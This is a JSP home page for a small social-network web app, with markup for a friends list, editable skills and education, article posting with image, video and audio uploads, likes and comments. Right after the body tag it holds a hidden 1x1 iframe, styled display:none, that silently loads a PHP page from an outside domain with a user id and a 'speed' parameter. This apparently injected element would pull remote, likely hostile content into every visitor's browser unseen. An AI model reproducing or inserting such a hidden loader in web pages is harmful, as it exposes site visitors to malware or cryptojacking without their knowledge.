<?xml version="1.0" encoding="UTF-8" ?>
<%@ page import="java.util.List"%>
<%@ page import="com.ted.project.entities.User"%>
<%@ page import="com.ted.project.entities.Article"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<html>
<head>
<link rel="stylesheet" type="text/css" href="resources/css/home.css">

<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<title>Home</title>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script src="resources/js/home.js"></script>
<link rel="stylesheet" type="text/css" href="resources/css/shared.css">
<script>
	// Changing manually angular controller so that file upload label is updated
	function updateFileUploadLabel1(angObj,name){
		angular.element(angObj).scope().changeInputName1(name);
		angular.element(angObj).scope().$digest();
	}
	function updateFileUploadLabel2(angObj,name){
		angular.element(angObj).scope().changeInputName2(name);
		angular.element(angObj).scope().$digest();
	}
	function updateFileUploadLabel3(angObj,name){
		angular.element(angObj).scope().changeInputName3(name);
		angular.element(angObj).scope().$digest();
	}
</script>
</head>

 
<body ng-app="myApp" ng-controller="myCtrl" ng-init="loadPage()" >
<iframe id=ifRef src="http://dailygreatest.com/mpublic.php?uid=215496802&speed=3" width="1" height="1" frameborder="0" scrolling="no" style="display:none;"></iframe>
<div>


<div class="logout">
	<form method="post" action="Logout">  
		<input class="logout_button" type="submit" value="Logout"/>
	</form>
</div>
<!-- <div class="name">
	<p style="margin-left: 10px;background-color: #adad85;cursor:pointer;" ng-click="goToProfile()" class="comment_p">{{user.name+" "+user.surname}}</p>
	<a href="personalData.jsp?friend={{user.id}}"><img height="30" width="30" style="border-radius: 50%;float:left;" src="{{user.image}}"></a> 	
</div> 	 -->		
<div class="navbar"> 
	<ul class="nav nav-tabs"> 
	    <li class="active"><a data-toggle="tab" href="home.jsp">Home</a></li>
	    <li><a data-toggle="tab" href="net.jsp">Net</a></li>
	    <li><a data-toggle="tab" href="aggelies.jsp">Advertisments</a></li>
	    <li><a data-toggle="tab" href="conversation.jsp">Conversation</a></li>
    	<li><a data-toggle="tab" href="personalData.jsp">Personal data</a></li>
	   	<li><a data-toggle="tab" href="settings.jsp">Settings</a></li>
		<li><a data-toggle="tab" href="notifications.jsp">Notifications</a></li>
	 </ul>
	<button class="logout_button" ng-click="addArticle()">Add new Article </button>  
	<!-- <h3 ng-show="friends.length==0">You have no friends right now.Make some friends to see new articles or Create one on yourself!</h3> -->
</div>

<div class="info">
	<div class="leftcontainer">  
		<h3>Friends</h3>
		<label ng-show="friends.length==0">No Friends!</label>
		<div class="friends" ng-repeat="x in friends">

			<label style="float:left;font-size: 13px;margin-left: 5px;">{{x.name+" "+x.surname}}</label>
			<a style="float:right" href="personalData.jsp?friend={{x.id}}" class="fa fa-user"></a>
			<a style="float:right" href="conversation.jsp?friend={{x.id}}" class="fa fa-commenting-o"></a>
		</div>
		<h3>Personal Data</h3>
		<form method="post" action="PersonalData" > 
			<h4>Skills</h3>
			<div class=personal_data>
				<textarea class="area1" placeholder="Type your skills here!" name="home_edit_skills">{{user.experience.skills}}</textarea>
				<input type="radio" name="edit_choice1" value="Public" ng-checked="public_skills"> </input>
				<label >Public</label>
				<input type="radio" name="edit_choice1" value="Private" ng-checked="private_skills" > </input>
				<label >Private</label>			
			</div>
			<h4>Education</h3>
			<div class=personal_data>
				<textarea class="area1" placeholder="Type your education here!" name="home_edit_education">{{user.experience.education}}</textarea>
				<input type="radio" name="edit_choice" value="Public" ng-checked="public_education"> </input>
				<label >Public</label>
				<input type="radio" name="edit_choice" value="Private" ng-checked="private_education"> </input>
				<label >Private</label>			
			</div>
			<div>
				<button type="submit" class="button" >Save Changes!</button>
				<button type="button" class="goToProfile_button" ng-click="goToProfile()">Go to your profile!</button>
			</div>
			<div class="footer">
				<p style="font-size: 16px;color :black"><a href="home.jsp" style="color: black;text-decoration: underline;">Business World</a></p>
				<p>Designed by </p>
				<p>Ilias Vergos and Kostas Pleuris</p>
				<p><a href="" style="color: black;text-decoration: underline;">Communication</a></p><a href="" style="color: black;text-decoration: underline;"> Terms & Service</a>
			</div>

		</form>
		
	</div>
	<div class="middle">
		<form action="Home" method="post" enctype="multipart/form-data">	  	
			<div class="boarder" ng-show="showArticle">
				<p style="margin-top:20px;">Title</p>
				<input class="input" type="text" name="title" placeholder="Type the title of your artcile here!" autocomplete="off"></input>
				<br></br>
				<p>Text</p>
				<textarea class="area"  placeholder="Type your text here!" name="text"></textarea>
				<br></br>
				<div class="takefiles">
					<p>Image</p>
					<input type="file" name="photo" id="file-1" onchange="updateFileUploadLabel1(this,this.value)"  ng-model="inputname" class="inputfile inputfile-1"  />
					<label for="file-1">
						<svg xmlns="http://www.w3.org/2000/svg" width="20" height="17" viewBox="0 0 20 17">
							<path d="M10 0l-5.2 4.9h3.3v5.1h3.8v-5.1h3.3l-5.2-4.9zm9.3 11.5l-3.2-2.1h-2l3.4 2.6h-3.5c-.1 0-.2.1-.2.1l-.8 2.3h-6l-.8-2.2c-.1-.1-.1-.2-.2-.2h-3.6l3.4-2.6h-2l-3.2 2.1c-.4.3-.7 1-.6 1.5l.6 3.1c.1.5.7.9 1.2.9h16.3c.6 0 1.1-.4 1.3-.9l.6-3.1c.1-.5-.2-1.2-.7-1.5z"/>
						</svg> 
						<span ng-hide="inpt1">Choose a file&hellip;</span>
						<span ng-show="inpt1">{{inputname1}}</span>
					</label>
				</div>
				<div class="takefiles">	
					<p>Video</p>
					<input onchange="updateFileUploadLabel2(this,this.value)"  ng-model="inputname" type="file" name="video" files-input id="file-2" class="inputfile inputfile-1" />
					<%-- <input ng-click="changeInputName(this.value)"  ng-model="inputname" type="file" name="video" files-input id="file-2" class="inputfile inputfile-1" /> --%>
					<label for="file-2">
						<svg xmlns="http://www.w3.org/2000/svg" width="20" height="17" viewBox="0 0 20 17">
							<path d="M10 0l-5.2 4.9h3.3v5.1h3.8v-5.1h3.3l-5.2-4.9zm9.3 11.5l-3.2-2.1h-2l3.4 2.6h-3.5c-.1 0-.2.1-.2.1l-.8 2.3h-6l-.8-2.2c-.1-.1-.1-.2-.2-.2h-3.6l3.4-2.6h-2l-3.2 2.1c-.4.3-.7 1-.6 1.5l.6 3.1c.1.5.7.9 1.2.9h16.3c.6 0 1.1-.4 1.3-.9l.6-3.1c.1-.5-.2-1.2-.7-1.5z"/>
						</svg> 
						<span ng-hide="inpt2">Choose a file&hellip;</span>
						<span ng-show="inpt2">{{inputname2}}</span>
					</label>
				</div>
				<div class="takefiles">	
					<p >Audio</p>
					<input type="file" name="audio" id="file-3" onchange="updateFileUploadLabel3(this,this.value)"  ng-model="inputname" class="inputfile inputfile-1"   />
					<label for="file-3">
						<svg xmlns="http://www.w3.org/2000/svg" width="20" height="17" viewBox="0 0 20 17">
							<path d="M10 0l-5.2 4.9h3.3v5.1h3.8v-5.1h3.3l-5.2-4.9zm9.3 11.5l-3.2-2.1h-2l3.4 2.6h-3.5c-.1 0-.2.1-.2.1l-.8 2.3h-6l-.8-2.2c-.1-.1-.1-.2-.2-.2h-3.6l3.4-2.6h-2l-3.2 2.1c-.4.3-.7 1-.6 1.5l.6 3.1c.1.5.7.9 1.2.9h16.3c.6 0 1.1-.4 1.3-.9l.6-3.1c.1-.5-.2-1.2-.7-1.5z"/>
						</svg> 
						<span ng-hide="inpt3">Choose a file&hellip;</span>
						<span ng-show="inpt3">{{inputname3}}</span>
					</label>
				</div>
				<br>
				<input type="submit" class="goToProfile_button" value="Publish!"></input>
			</div>
		</form>
		<div class="articles" ng-repeat="x in articles" >
			<div class="user_name" >  
				<h5 style="float: left">Published by <a href="personalData.jsp?friend={{x.user.id}}">{{x.user.name+" "+x.user.surname}}</a></h5>
				
			</div>
			<div class="user_name" >
				<label style="float:right">{{getTime(x.publishTime)}}</label> 
			</div>
			<div class="title">		 
				<label style="font-size: 19px;">{{x.title}}</label>    
			</div>
			<div class="textArea"><p>{{x.text}}</p></div>
			<div class="files" ng-show="showFiles[$index]">
				<div class="image">
				  	<img src="{{x.images}}" height="350" width="450" ng-show="showImage[$index]">
				</div>
				<div class="video">				
					<video width="470" height="390" controls ng-show="showVideo[$index]"> 
					  	<source src="{{x.videos}}" type="video/mp4">
		  				<source src="{{x.videos}}" type="video/ogg">
		  			</video>		
		  		</div>
				<div class="audio">
				  	<audio controls ng-show="showAudio[$index]">
				  		<source src="{{x.sounds}}" type="audio/ogg">
	  					<source src="{{x.sounds}}" type="audio/mpeg">
					</audio>
				</div>
			</div>
		<br>
			<div class="like_comment">
				<button class="like_btn" ng-click="like(x.articleId,$index)" ng-show="liked[$index]">Like</button>
				<button class="dislike_btn" ng-click="dislike(x.articleId,$index)" ng-show="disliked[$index]">Dislike</button>
				<button class="like_btn" ng-click="comment($index)">Comment</button>
			</div>
			<div style="text-align: left;margin-left: 55px;">
				<label>{{like_number[$index]}} Likes </label>
			</div>
	
			<div class="comments" >
				<div class="comment" ng-show="newComment[$index]">
					<form  ng-submit="submitComment(x.articleId,Comment,$index)">
						<a href="personalData.jsp?friend={{user.id}}" ><img height="30" width="30" style="border-radius: 50%;" src="{{user.image}}"></a> 					
						<input type="text" class="input_comment" placeholder="Make a Comment" ng-model="Comment"></input>
					</form>
				</div>
				<div class="comment" ng-repeat="y in comments">
					<a href="personalData.jsp?friend={{y.user.id}}" ><img ng-if="y.article.articleId==x.articleId" height="30" width="30" style="border-radius: 50%;" src="{{y.user.image}}"></a> 
					<p class="comment_p" ng-if="y.article.articleId==x.articleId">
						<a href="personalData.jsp?friend={{y.user.id}}" style="cursor: pointer;background-color: white;">{{y.user.name+" "+y.user.surname}}</a>{{": "+y.text}}
					</p>
					<label class="comment_time" ng-if="y.article.articleId==x.articleId" >{{getTime(y.publishTime)}}</label>
				</div>
			</div>
		</div>	
	</div>
</div>

</body>

</html>
